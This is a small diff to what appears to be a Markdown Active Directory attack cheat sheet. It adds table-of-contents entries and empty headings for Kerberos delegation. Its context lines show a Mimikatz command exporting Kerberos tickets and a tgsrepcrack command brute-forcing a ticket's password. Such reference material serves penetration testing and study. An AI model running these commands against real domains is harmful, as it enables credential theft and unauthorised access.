@@ -27,6 +27,8 @@ Last update: **19 Nov 2021**
   -  [Kerberoast](#kerberoast)
   -  [Targeted Kerberoasting AS REPs](#targeted-Kerberoasting-AS-REPs)
   -  [Targeted Kerberoasting Set SPN](#targeted-Kerberoasting-set-spn)
+  -  [Kerberos Delegation](#kerberoast-delegation)
+     -  [Unconstrained Delegation](#unconstrained-delegation) 
 
 ## Pre-requisites
 ### Using PowerView:
@@ -461,3 +463,7 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 # Brute force the password with tgsrepcrack
 python.exe .\kerberoast\tgsrepcrack.py .\kerberoast\wordlists.txt '.\3-40a10000-user01@ops~whatever1-CORP.CORPORATE.LOCAL.kirbi'
 ```
+
+### Kerberos Delegation
+
+## Unconstrained Delegation
